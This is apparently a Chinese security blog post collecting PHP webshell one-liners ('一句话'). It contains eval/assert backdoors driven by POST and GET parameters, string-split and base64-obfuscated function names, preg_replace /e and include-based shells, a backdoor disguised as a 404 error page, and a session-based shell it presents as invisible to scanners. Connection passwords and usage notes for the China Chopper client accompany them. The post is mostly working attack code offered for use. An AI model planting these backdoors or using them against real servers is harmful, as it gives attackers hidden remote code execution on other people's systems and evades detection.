---
title: 一句话
date: 2016-03-29T21:25:45+08:00
update: 2016-01-01
categories: [网络安全]
tags:
---
# PHP
1. ` <?php eval($_POST[$_GET["id"]]);?> `
1. ` <?php eval($_POST[witkey]);?> `
  pwd:[witkey] Encoder:[default]
2. ` <?php assert($_POST[sb]);?> `

2. ` <?php $a = "a"."s"."s"."e"."r"."t";  $a($_POST[cc]);  ?> `
  pwd:[cc] Encoder:[base64]
3. ` <?php
      $ant=base64_decode("YXNzZXJ0");
      $ant($_POST['ant']); `
  pwd:[ant] Encoder:[base64]


5. 菜刀一句话 pwd:[h] Encoder:[base64]
 ` <?php
      $hh = "p"."r"."e"."g"."_"."r"."e"."p"."l"."a"."c"."e";
      $hh("/[discuz]/e",$_POST['h'],"Access"); `
4. `  <?php ($_=@$_GET[2]).@$_($_POST[1])?> `
  ?2=assert pwd:[1] Encoder:[base64]

` <?php @$_GET[a]($_POST[1]);?> `
### 超级隐蔽的PHP后门：
` ?a=assert&b=${fputs%28fopen%28base64_decode%28Yy5waHA%29,w%29,base64_decode%28PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x%29%29}; `
` <?php $_GET[a]($_GET[b]);?> `
利用方法：

--------------------------------------------------------------------------------
重命名任何文件
```
<?php
  $reg="c"."o"."p"."y";
  $reg($_FILES[MyFile][tmp_name],$_FILES[MyFile][name]);
```

5、include ($uid);
//gif插一句话
//危险的include函数，直接编译任何文件为php格式运行，POST www.xxx.com/index.php?uid=/home/www/bbs/image.gif


```
<?php
@$_="s"."s"./*-/*-*/"e"./*-/*-*/"r";
@$_=/*-/*-*/"a"./*-/*-*/$_./*-/*-*/"t";
@$_/*-/*-*/($/*-/*-*/{"_P"./*-/*-*/"OS"./*-/*-*/"T"}
[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]); // 密码-7
?>

```

危险的include函数，直接编译任何文件为php格式运行 pwd:[xbid] Encoder:[base64]
```
<?php
$filename=$_GET['xbid'];
include ($filename);
```

```
<?php
$_="";
$_[+""]='';
$_="$_"."";
$_=($_[+""]|"").($_[+""]|"").($_[+""]^"");
?>
<?php ${'_'.$_}['_'](${'_'.$_}['__']);?>
	在菜刀里写http://site/2.php?_=assert&__=eval($_POST['pass']) 密码是pass。如果你用菜刀的附加数据的话更隐蔽，或者用其它注射工具也可以，因为是post提交的。
```
toby57 早期用的后门
```
<?php
if(crypt($_SERVER['HTTP_H0ST'],51)==’514zR17F8j0q6′){@file_put_contents($_SERVER['HTTP_X'],$_SERVER['HTTP_Y']);header("Location: ./".$_SERVER['HTTP_X']);};
?>
```



```

  2、
  $filename=$_GET['xbid'];
  include ($filename);
  //危险的include函数，直接编译任何文件为php格式运行
  3、
  $reg="c"."o"."p"."y";
  $reg($_FILES[MyFile][tmp_name],$_FILES[MyFile][name]);
  //重命名任何文件
  4、
  $gzid = "p"."r"."e"."g"."_"."r"."e"."p"."l"."a"."c"."e";
  $gzid("/[discuz]/e",$_POST['h'],"Access");
  //菜刀一句话
  5、include ($uid);
  //危险的include函数，直接编译任何文件为php格式运行，POST www.xxx.com/index.php?uid=/home/www/bbs/image.gif
  //gif插一句话
  6、典型一句话
  程序后门代码
  <?php eval_r($_POST[sb])?>
  程序代码
  <?php @eval_r($_POST[sb])?>
  //容错代码
  程序代码
  <?php assert($_POST[sb]);?>
  //使用lanker一句话客户端的专家模式执行相关的php语句
  程序代码
  <?$_POST['sa']($_POST['sb']);?>
  程序代码
  <?$_POST['sa']($_POST['sb'],$_POST['sc'])?>
  程序代码
  <?php
  @preg_replace("/[email]/e",$_POST['h'],"error");
  ?>
  //使用这个后,使用菜刀一句话客户端在配置连接的时候在"配置"一栏输入
  程序代码
  <O>h=@eval_r($_POST1);</O>
  程序代码
  <script language="php">@eval_r($_POST[sb])</script>
  //绕过<?限制的一句话
  ```
### 超级隐蔽的PHP后门：

` <?php $_GET[a]($_GET[b]);?> `
利用方法：
` ?a=assert&b=${fputs%28fopen%28base64_decode%28Yy5waHA%29,w%29,base64_decode%28PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x%29%29}; `


### 利用404页面隐藏PHP小马：
```
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>
<?php
@preg_replace("/[pageerror]/e",$_POST['error'],"saft");
header('HTTP/1.1 404 Not Found');
?>
```
### 无特征隐藏PHP一句话：
```
<?php
session_start();
$_POST['code'] && $_SESSION['theCode'] = trim($_POST['code']);
$_SESSION['theCode']&&preg_replace('\'a\'eis','e'.'v'.'a'.'l'.'(base64_decode($_SESSION[\'theCode\']))','a');
```

	将$_POST['code']的内容赋值给$_SESSION['theCode']，然后执行$_SESSION['theCode']，亮点是没有特征码。用扫描工具来检查代码的话，是不会报警的，达到目的了。
